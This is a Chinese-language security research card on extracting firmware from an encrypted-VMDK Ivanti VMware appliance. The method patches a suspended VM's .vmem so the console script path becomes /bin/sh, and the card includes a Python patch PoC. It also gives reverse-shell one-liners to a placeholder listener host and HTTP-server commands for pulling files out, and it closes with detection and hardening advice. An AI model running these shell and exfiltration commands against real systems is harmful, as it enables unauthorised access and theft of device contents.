---
id: code-analysis-reverse-firmware-vmem-patch-console-script-shell
title: VMware 挂起内存 vmem 等长字符串补丁：替换控制台脚本路径获取加密设备 Shell
type: scenario
domain: code-analysis
path: code-analysis/reverse/firmware
technique: vmware-vmem-equal-length-string-patch-console-script
aliases:
- vmem 内存补丁
- 等长字符串替换
- dsconfig.pl 替换
- 加密 VMDK 固件提取
- 设备控制台 Shell
tags:
- firmware
- vmware
- vmem
- memory-patch
- appliance
- boot-chain
- shell
- ivanti
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:36:29+08:00'
  notes: 已对照原文与截图核对：挂起后 vmem 中存在 /home/bin/dsconfig.pl，010 Editor 替换为 15 个 / + bin/sh 共 21 字节等长串，恢复运行后控制台超时回车得到 sh-4.2# Shell（图8），随后 telnet 反弹与 iptables/SimpleHTTPServer 导出 /home/bin、/home/lib，链路与卡一致。未验证点：需宿主机/快照级访问，未本机复跑；属本地固件提取技巧而非远程漏洞；无产品版本标记，未设 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

对使用加密 VMDK、无法直接挂载文件系统的 VMware 设备镜像，可在虚拟机挂起后直接编辑 `.vmem` 中的控制台启动脚本路径，把 `/home/bin/dsconfig.pl` 等长替换为 `/bin/sh`（用 `/` 补齐到同样 21 字节），恢复运行并在控制台超时后按回车，即可在设备内部拿到底层 Shell，进而导出 `/home/bin`、`/home/lib` 等文件。

## 原理

- VMware 挂起虚拟机时会把客户机物理内存写入 `.vmem` 文件；其中保留着控制台程序即将调用的脚本路径字符串。控制台界面在启动/超时后会执行该路径，路径本身没有签名或完整性校验。
- 把路径字符串替换为 `/bin/sh` 即可让控制台调用 shell。关键约束是**等长替换**：原字符串 `/home/bin/dsconfig.pl` 为 21 字节，替换串用 15 个 `/` 加 `bin/sh` 共 21 字节（等价于 14 个填充 `/` 加 `/bin/sh`），长度不变就不会移动后续内存、破坏字符串表或指针引用，避免虚拟机启动异常。
- 加密 VMDK 只是限制“离线挂载磁盘”，并不等于保护运行中的客户机内存。设备正常启动后自身会解密并挂载 rootfs，此时拿到 Shell 就能直接读取明文文件系统；因此该手法绕过的不是磁盘加密算法，而是“没有运行环境就无法读盘”的分析障碍。
- 该手法依赖对 `.vmem` 的读写权限，通常意味着已控制宿主机/虚拟机文件或拿到镜像快照；它是一次本地/离线固件提取技巧，不是远程漏洞。

## 触发条件

- 目标为 VMware 虚拟化设备，磁盘（VMDK）加密，直接挂载无法读取文件系统。
- 能暂停/挂起虚拟机并访问其目录下的 `.vmem` 文件（宿主机权限、快照或镜像副本）。
- 内存中存在控制台启动脚本路径字符串（本例 `/home/bin/dsconfig.pl`），且该路径会在启动/控制台超时后被调用。
- 替换串与被替换串长度一致（本例均为 21 字节）；控制台可交互，且没有在调用前对内存做签名/完整性校验。

## 利用步骤

1. 导入 OVF 并完成设备初始化（网络、管理员账号、Web 登录），确认设备可正常启动到控制台。
2. 挂起虚拟机，在虚拟机目录找到 `.vmem`（本例形如 `ivanti_22.7r2.3-<hash>.vmem`）。
3. 用十六进制编辑器打开 `.vmem`，搜索 `/home/bin/dsconfig.pl`，全部替换为等长的 `///////////////bin/sh`（15 个 `/` + `bin/sh`，共 21 字节）；保存。
4. 恢复虚拟机运行，等待控制台界面超时，按回车；控制台调用的“配置脚本”已变成 `/bin/sh`，直接落入底层 Shell。
5. 在设备内反弹 Shell 便于操作：`telnet <lhost> 8888 | /bin/bash | telnet <lhost> 8889` 或 `bash -i >& /dev/tcp/<lhost>/<port> 0>&1`。
6. 放行传输端口（`iptables -A INPUT -p tcp --dport 8000 -j ACCEPT`），用 `python -m SimpleHTTPServer 8000` 把 `/home/bin/web`、`/home/lib/*.so` 等文件下载到分析机。

## PoC

```python
# 对已挂起虚拟机的 vmem 做等长替换；先备份原文件
old = b"/home/bin/dsconfig.pl"          # 21 bytes
new = b"///////////////bin/sh"          # 15 '/' + 'bin/sh' = 21 bytes
assert len(old) == len(new) == 21

data = open("ivanti_22.7r2.3.vmem", "rb").read()
count = data.count(old)
open("ivanti_22.7r2.3.vmem", "wb").write(data.replace(old, new))
print("patched occurrences:", count)
```

```bash
# 设备内：反弹 Shell 与文件外带
telnet <lhost> 8888 | /bin/bash | telnet <lhost> 8889
iptables -A INPUT -p tcp --dport 8000 -j ACCEPT
cd /home && python -m SimpleHTTPServer 8000
```

## 变体与关联

- 变体：把控制台脚本路径换成其他同长度路径（如 `/bin/bash` 需要补齐，或先替换为同长度启动器再执行命令）；也可替换初始化脚本、服务单元路径、SSH `authorized_keys` 路径等“启动时会被执行/读取”的字符串。
- 变体：若目标字符串不在 `.vmem`（压缩/加密内存、启动后才生成），可改为补丁 initramfs/启动脚本，或在拿到任意内存写后动态修改；思路都是“改启动链中最先被调用的可信路径”。
- 关联：[[binary-pwn-stack-ivanti-cve-2025-0282-clientcapabilities-vtable-rop]]（同一设备的远程预认证栈溢出；本卡的 Shell 与文件导出可用于获取 `web`/`libdsplibs.so`、核对偏移与 gadget）。
- 边界：需要宿主机/快照级访问；等长替换必须精确，长度变化可能导致设备启动失败；若设备启用内存加密、安全启动或对脚本做签名校验，该手法失效。

## 检测与防御

- 检测：监控虚拟机目录中 `.vmem` 的非正常修改时间/哈希变化；检查控制台是否出现非预期的 shell 进程或异常脚本路径；设备启动完整性扫描应覆盖内存中的关键路径字符串，而不只扫描磁盘文件。
- 加固：对挂起内存启用加密，限制宿主机与快照文件的访问权限；启用安全启动/度量启动，对控制台脚本做签名或哈希校验；控制台脚本调用前校验路径与文件完整性。
- 防御：不要仅依赖 VMDK 加密保护设备内容；把虚拟机文件、快照和管理接口纳入与设备本身同等级的保护范围，离线镜像也应视为敏感资产。
